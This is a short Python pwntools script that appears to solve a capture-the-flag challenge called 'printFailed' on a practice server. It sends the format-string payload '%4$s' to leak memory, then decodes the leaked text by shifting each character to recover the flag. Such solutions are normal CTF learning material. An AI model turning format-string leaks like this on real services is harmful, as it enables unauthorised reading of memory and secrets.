from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=process("./printFailed")
io=remote("node3.anna.nssctf.cn",28711)

io.sendlineafter(b"flag?\n",b"%4$s")
io.recvuntil(b"ssed: \n")
tmp=str(io.recvline())
print(tmp)
flag=''
for i in tmp:
    flag+=chr(ord(i)-1)

print(flag)

io.interactive()